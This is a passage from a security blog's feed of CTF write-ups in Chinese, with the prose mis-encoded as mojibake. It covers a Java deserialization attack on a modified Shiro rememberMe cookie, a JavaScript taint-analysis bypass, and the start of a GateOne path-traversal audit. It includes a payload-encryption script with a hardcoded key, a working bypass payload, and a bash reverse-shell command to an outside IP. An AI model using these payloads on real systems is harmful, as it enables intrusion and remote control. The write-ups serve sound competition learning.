Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; i++) &#123;</span><br><span class="line">      out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">      out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; i++) &#123;</span><br><span class="line">      result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™ç›¸å½“äºé­”æ”¹äº†åŸç‰ˆçš„ shiro, åŸç‰ˆçš„æ˜¯ç›´æ¥ç”¨çš„ AES. æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œé­”æ”¹åç§˜é’¥æ˜¯è¯»çš„ <code>com/collection/shiro/manager/remember.key</code>. (docker åˆå§‹è‡ªå¸¦ä¸€ä¸ª key, æ‰€æœ‰äººéƒ½ç”¨çš„ä¸€ä¸ª, ä¸ä¼šè‡ªå·±ç”Ÿæˆ).<br>ç„¶åç®—æ³•ä¹Ÿä» AES å˜æˆäº†å‡ºé¢˜äººæ‰‹å†™çš„åŠ å¯†ç®—æ³•. ç„¶åå°†åºåˆ—åŒ–åçš„å¯¹è±¡ base64 ä¹‹åæ”¾åœ¨äº† json çš„ <code>serialize_data</code> é‡Œé¢<br>æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬äºŒæ¬¡é‡å†™ä¸€ä¸‹ ysoserial ç”Ÿæˆçš„ payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/home/rmb122/repos/ysoserial/target/1.bin'</span></span><br><span class="line">payload = open(payload, <span class="string">'rb'</span>).read()</span><br><span class="line">payload = b64encode(payload).decode()</span><br><span class="line">data = &#123;<span class="string">"user_is_login"</span>: <span class="string">"1"</span>, <span class="string">"sign"</span>: <span class="string">"9368b2d39093ed7164841e4050f9cdbeasfda-92u134-"</span>, <span class="string">"ip_address"</span>: <span class="string">"10.10.19.245"</span>, <span class="string">"user_agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"serialize_data"</span>: payload&#125;</span><br><span class="line">data = dumps(data).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span></span><br><span class="line">k = md5(key.encode()).hexdigest()</span><br><span class="line">k = sha1(k.encode()).hexdigest().encode()</span><br><span class="line"></span><br><span class="line">newdata = bytearray()</span><br><span class="line">newdata_2 = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    newdata.append(i)</span><br><span class="line">    newdata.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newdata)):</span><br><span class="line">    newdata_2.append(newdata[i] ^ k[i % len(k)])</span><br><span class="line"></span><br><span class="line">print(b64encode(newdata_2))</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ”¹åˆ° rememberMe çš„ Cookie ä¸Šå°±è¡Œäº†, å°è¯•äº†å‡ ä¸ª payload å› ä¸º Cookie æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„, å¹³å¸¸æ˜¯ç›´æ¥å°†åºåˆ—åŒ–æ•°æ® base64 è´´ä¸Šå»æ‰€ä»¥ä¸ä¼šè¶…å‡ºé™åˆ¶. è¿™é‡ŒåŒé‡ base64 åŠ ä¸ŠåŠ å¯†è¿˜å¾—å¸¦ä¸€ä¸ª xor key å¯¼è‡´å¾ˆå¤š payload å°±ä¸èƒ½ç›´æ¥ç”¨äº†. æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ç”¨ JRMPClient æ¥ä¸­è½¬ä¸€ä¸‹, åœ¨è‡ªå·±çš„æœºå™¨ä¸Šè·‘ä¸€ä¸ª ysoserial.exploit.JRMPListener å°± ok äº†.</p><p>è¿™é‡Œéœ€è¦æ³¨æ„åŸç‰ˆçš„ ysoserial æ˜¯ç›´æ¥ç”¨çš„ <code>java.Runtime.getRuntime().exec(payload)</code>, ç›¸å½“äº <code>execv(payload.split(&#39; &#39;))</code>, ä¼šå¯¼è‡´ <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.19.3/7777 0&gt;&amp;1&quot;</code> ä¹‹ç±»çš„ä¸èƒ½ç”¨, è¿™é‡Œå½“æ—¶æ˜¯ç”¨äº†åˆ«çš„å‘½ä»¤åˆ©ç”¨çš„æ¼æ´. èµ›å fork äº† <a href="https://github.com/rmb122/ysoserial" target="_blank" rel="noopener">ysoserial</a> æ”¹äº†ä¸‹, ç”¨çš„ <code>java.Runtime.getRuntime().exec(new String[]{})</code> å°±èƒ½ç›´æ¥å¼¹ shell ä¹‹ç±»çš„.</p><h2 id="XCTF-Final-babytaint-Writeup"><a href="#XCTF-Final-babytaint-Writeup" class="headerlink" title="XCTF Final babytaint Writeup"></a>XCTF Final babytaint Writeup</h2><p>æ‹¿åˆ°æ‰‹å…ˆ Google <code>jalangi2</code> æ˜¯ä¸ªå•¥, å¯ä»¥æœåˆ°æ˜¯ä¸ªå¯ä»¥ hook javascript å„ç§æ“ä½œçš„åº“. è¿™é‡Œæ˜¯æ‹¿æ¥æäº†æ±¡ç‚¹åˆ†æ.<br>å¦‚æœä¹‹å‰äº†è§£è¿‡ä¸€äº›ç¼–è¯‘åŸç†å’Œ PHP çš„ taint æ‹“å±•, é‚£è¿™é“é¢˜ç¡®å®æŒºç®€å•çš„. æœ¬è´¨å°±æ˜¯ä» /dev/urandom/ é‡Œé¢è·å–éšæœºå­—èŠ‚ä½œä¸º secret, é¢˜ç›® hook äº† â€œSourceâ€() çš„è°ƒç”¨, è¿”å›äº† taint è¿‡çš„ secret, ä½ éœ€è¦é€šè¿‡æŸç§æ–¹æ³• bypass æ‰è¿™ä¸ª taint. ä¹Ÿå°±æ˜¯å°†æ±¡ç‚¹å»é™¤.<br>æˆ‘ä»¬çœ‹ä¸€ä¸‹æºç , å…³é”®å°±æ˜¯è¿™ä¸ª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AnnotatedValue</span>(<span class="params">val, shadow</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.val = val;</span><br><span class="line"><span class="keyword">this</span>.shadow = shadow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªåŒ…è£…ç±», ç”¨ shadow æ¥è®°å½•æ˜¯å¦æ˜¯ taint è¿‡çš„å€¼. é¢˜ç›® hook ä½äº†æ‰€æœ‰è®¡ç®—, æ‹¿äºŒå…ƒè®¡ç®—æ¥çœ‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.binary = <span class="function"><span class="keyword">function</span>(<span class="params">iid, op, left, right, result</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> aleft = actual(left);</span><br><span class="line"><span class="keyword">const</span> aright = actual(right);</span><br><span class="line"><span class="keyword">switch</span> (op)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">result = aleft + aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">result = aleft - aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">result = aleft * aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">result = aleft / aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"%"</span>:</span><br><span class="line">result = aleft % aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;&lt;"</span>:</span><br><span class="line">result = aleft &lt;&lt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;&gt;"</span>:</span><br><span class="line">result = aleft &gt;&gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;&gt;&gt;"</span>:</span><br><span class="line">result = aleft &gt;&gt;&gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;"</span>:</span><br><span class="line">result = aleft &lt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;"</span>:</span><br><span class="line">result = aleft &gt; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&lt;="</span>:</span><br><span class="line">result = aleft &lt;= aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&gt;="</span>:</span><br><span class="line">result = aleft &gt;= aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"=="</span>:</span><br><span class="line">result = aleft == aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"!="</span>:</span><br><span class="line">result = aleft != aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"==="</span>:</span><br><span class="line">result = aleft === aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"!=="</span>:</span><br><span class="line">result = aleft !== aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">result = aleft &amp; aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"|"</span>:</span><br><span class="line">result = aleft | aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"^"</span>:</span><br><span class="line">result = aleft ^ aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"delete"</span>:</span><br><span class="line">result = <span class="keyword">delete</span> aleft[aright];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"instanceof"</span>:</span><br><span class="line">result = aleft <span class="keyword">instanceof</span> aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"in"</span>:</span><br><span class="line">result = aleft <span class="keyword">in</span> aright;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">errExit(op + <span class="string">" at "</span> + iid + <span class="string">" not found"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">result</span>: <span class="keyword">new</span> AnnotatedValue(result,</span><br><span class="line">shadow(left) || shadow(right))&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åªè¦ä¸¤ä¸ªè¿ç®—ç¬¦æœ‰ä¸€ä¸ªæ˜¯ taint è¿‡çš„, è¿”å›çš„ä¹Ÿæ˜¯ taint è¿‡çš„å€¼. åŒæ—¶æˆ‘ä»¬æƒ³è¦æ‹¿åˆ° flag, éœ€è¦è°ƒç”¨ â€œSinkâ€(secret), ä½†æ˜¯è¾“å…¥çš„ secret  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f === <span class="string">"Sink"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (shadow(args[<span class="number">0</span>]))</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> arr = actual(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> (!(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>) || arr.length !== <span class="number">0x10</span>)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"must use an array with length 16 as the key"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (shadow(arr[i])) <span class="comment">// check here</span></span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (actual(arr[i]) !== secret[i])</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">"Wrong key!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(fs.readFileSync(<span class="string">"flag"</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿä¸èƒ½æ˜¯è¢« train è¿‡çš„, è¿™å°±éœ€è¦ä¸€ç‚¹æŠ€å·§æ¥ bypass, è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ delete è¿™ä¸ªæ“ä½œç¬¦, å› ä¸º delete å½±å“çš„æ˜¯å·¦å€¼å¯¹è±¡çš„æœ¬èº«. è€Œè¿™é‡Œ hook çš„æ—¶å€™å¹¶ä¸ä¼šå°†å·¦å€¼ç»™ taint æ‰, åªä¼šå°†è¿”å›å€¼ undefined ç»™ taint.<br>æˆ‘ä»¬å¯ä»¥æä¸€ä¸ªå¤§å° 256 çš„æ•°ç»„, å°† secret ä½œä¸ºåˆ é™¤çš„ key, ç„¶åéå†æ‰¾åˆ°æ˜¯å“ªä¸ª key è¢« delete æ‰, æˆ‘ä»¬å°±èƒ½è·å¾— secret çš„å€¼è€Œä¸è¢« taint.<br>æœ€å payload å¦‚ä¸‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=[];a=[]; <span class="keyword">for</span> (z=<span class="number">0</span>;z&lt;<span class="number">16</span>;z++)&#123;<span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;a[i]=<span class="number">0</span>;&#125;;t=<span class="string">"Source"</span>();<span class="keyword">delete</span> a[t[z]];<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;<span class="keyword">if</span> (a[i] === <span class="literal">undefined</span>)&#123;key[z]=i;&#125;&#125;&#125;;<span class="string">"Sink"</span>(key);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸æ˜¯å¾ˆå¤æ‚, è¿™é“é¢˜å¥½åƒä¹Ÿæœ‰å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥ 233</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å› ä¸ºæœ€è¿‘è¯¾ç¨‹éå¸¸éå¸¸å¤š, è¿˜é¡ºå¸¦è€ƒè¯• + å®éªŒæŠ¥å‘Š, å’•å’•å’•æ‰äº†è®¸å¤šæ¯”èµ›, çœŸæ­£å»çš„ä¹Ÿåªæœ‰ OGeek, å…¶ä»–éƒ½æ˜¯äº‘æ¯”èµ›.&lt;br&gt;æ‹¿åšå‡ºæ¥çš„é¢˜ç›®é‡Œé¢é€‰ä¸¤é¢˜å†™ä¸ª Writeup å§, ä¸ç„¶å¤ªä¹…æ²¡æ›´æ–°äº† (é€ƒ&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Ogeek Easy Realworld Challenge 1&amp;2 Writeup</title>
    <link href="https://rmb122.com/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/"/>
    <id>https://rmb122.com/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/</id>
    <published>2019-08-28T01:58:59.000Z</published>
    <updated>2019-08-28T02:04:58.951Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡ Ogeek çš„ web éƒ½æŒºæœ‰æ„æ€. è¿™ä¸¤é¢˜åå‘ä»£ç å®¡è®¡, è€Œä¸”å¦‚é¢˜ç›®å <code>Easy Realworld</code>, éƒ½æ˜¯å®¡è®¡åº”ç”¨æœ¬èº«çš„æ¼æ´, å·®ä¸å¤šå°±æ˜¯æ‰¾ 0day äº†, åœ¨è¿™é‡Œåˆ†äº«ç»™å¤§å®¶.</p><a id="more"></a><h2 id="Ogeek-Easy-Realworld-Challenge-1"><a href="#Ogeek-Easy-Realworld-Challenge-1" class="headerlink" title="Ogeek Easy Realworld Challenge 1"></a>Ogeek Easy Realworld Challenge 1</h2><p>æ‰“å¼€ç½‘é¡µ, å‘ç°æ˜¯ä¸ªåœ¨çº¿ ssh è¿æ¥å™¨, æ ¹æ®å†™çš„å¤§å¤§ <code>Gateone</code>, åœ¨ github ä¸Šæ‰¾åˆ° <code>https://github.com/liftoff/GateOne</code>, è€Œä¸”ä¸Šæ¬¡æ›´æ–°æ˜¯ 2017 å¹´, å¾ˆå¯èƒ½å­˜åœ¨æœªä¿®å¤æ¼æ´. å…ˆ fuzz äº†ä¸€æ³¢æ²¡æœ‰ä»€ä¹ˆæ”¶è·, è€Œä¸”å‡ ä¹æ˜¯åˆšå¼€ç®±çš„çŠ¶æ€, äºæ˜¯å°è¯•ä»£ç å®¡è®¡.  </p><p>æ ¹æ® <code>run_gateone.py</code> é‡Œé¢çš„  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gateone.core.server <span class="keyword">import</span> main</span><br><span class="line"></span><br><span class="line">main(installed=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° web æœåŠ¡ <code>gateone/core/server.py</code>,<br>åœ¨ 3692 è¡Œå¯ä»¥æ‰¾åˆ° è®¾ç½® Handler çš„åœ°æ–¹, </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">handlers = [</span><br><span class="line">            (index_regex, MainHandler),</span><br><span class="line">            (<span class="string">r"%sws"</span> % url_prefix,</span><br><span class="line">                ApplicationWebSocket, dict(apps=APPLICATIONS)),</span><br><span class="line">            (<span class="string">r"%sauth"</span> % url_prefix, AuthHandler),</span><br><span class="line">            (<span class="string">r"%sdownloads/(.*)"</span> % url_prefix, DownloadHandler),</span><br><span class="line">            (<span class="string">r"%sdocs/(.*)"</span> % url_prefix, tornado.web.StaticFileHandler, &#123;</span><br><span class="line">                <span class="string">"path"</span>: docs_path,</span><br><span class="line">                <span class="string">"default_filename"</span>: <span class="string">"index.html"</span></span><br><span class="line">            &#125;)</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° <code>downloads/</code> ç”¨çš„ä¸æ˜¯ tornado è‡ªå¸¦çš„ StaticFileHandler, è€Œæ˜¯ä½œè€…è‡ªå·±é€ çš„è½®å­, å¯èƒ½å­˜åœ¨æ¼æ´.<br>åœ¨ 924 è¡Œå¯ä»¥æ‰¾åˆ° get æ–¹æ³•çš„å®šä¹‰  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, path, include_body=True)</span>:</span></span><br><span class="line">        session_dir = self.settings[<span class="string">'session_dir'</span>]</span><br><span class="line">        user = self.current_user</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> <span class="string">'session'</span> <span class="keyword">in</span> user:</span><br><span class="line">            session = user[<span class="string">'session'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.error(_(<span class="string">"DownloadHandler: Could not determine use session"</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="comment"># Something is wrong</span></span><br><span class="line">        filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">        abspath = os.path.abspath(filepath)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">            self.set_status(<span class="number">404</span>)</span><br><span class="line">            self.write(self.get_error_html(<span class="number">404</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(abspath):</span><br><span class="line">            <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">403</span>, <span class="string">"%s is not a file"</span>, path)</span><br><span class="line">        <span class="keyword">import</span> stat, mimetypes</span><br><span class="line">        stat_result = os.stat(abspath)</span><br><span class="line">        modified = datetime.fromtimestamp(stat_result[stat.ST_MTIME])</span><br><span class="line">        self.set_header(<span class="string">"Last-Modified"</span>, modified)</span><br><span class="line">        mime_type, encoding = mimetypes.guess_type(abspath)</span><br><span class="line">        <span class="keyword">if</span> mime_type:</span><br><span class="line">            self.set_header(<span class="string">"Content-Type"</span>, mime_type)</span><br><span class="line">        <span class="comment"># Set the Cache-Control header to private since this file is not meant</span></span><br><span class="line">        <span class="comment"># to be public.</span></span><br><span class="line">        self.set_header(<span class="string">"Cache-Control"</span>, <span class="string">"private"</span>)</span><br><span class="line">        <span class="comment"># Add some additional headers</span></span><br><span class="line">        self.set_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        <span class="comment"># Check the If-Modified-Since, and don't send the result if the</span></span><br><span class="line">        <span class="comment"># content has not been modified</span></span><br><span class="line">        ims_value = self.request.headers.get(<span class="string">"If-Modified-Since"</span>)</span><br><span class="line">        <span class="keyword">if</span> ims_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">import</span> email.utils</span><br><span class="line">            date_tuple = email.utils.parsedate(ims_value)</span><br><span class="line">            if_since = datetime.fromtimestamp(time.mktime(date_tuple))</span><br><span class="line">            <span class="keyword">if</span> if_since &gt;= modified:</span><br><span class="line">                self.set_status(<span class="number">304</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># Finally, deliver the file</span></span><br><span class="line">        <span class="keyword">with</span> io.open(abspath, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line">            hasher = hashlib.sha1()</span><br><span class="line">            hasher.update(data)</span><br><span class="line">            self.set_header(<span class="string">"Etag"</span>, <span class="string">'"%s"'</span> % hasher.hexdigest())</span><br><span class="line">            <span class="keyword">if</span> include_body:</span><br><span class="line">                self.write(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">assert</span> self.request.method == <span class="string">"HEAD"</span></span><br><span class="line">                self.set_header(<span class="string">"Content-Length"</span>, len(data))</span><br></pre></td></tr></table></figure><p>æ³¨æ„å…³é”®éƒ¨åˆ†,  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.join(session_dir, session, <span class="string">'downloads'</span>, path)</span><br><span class="line">abspath = os.path.abspath(filepath)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(abspath):</span><br><span class="line">    self.set_status(<span 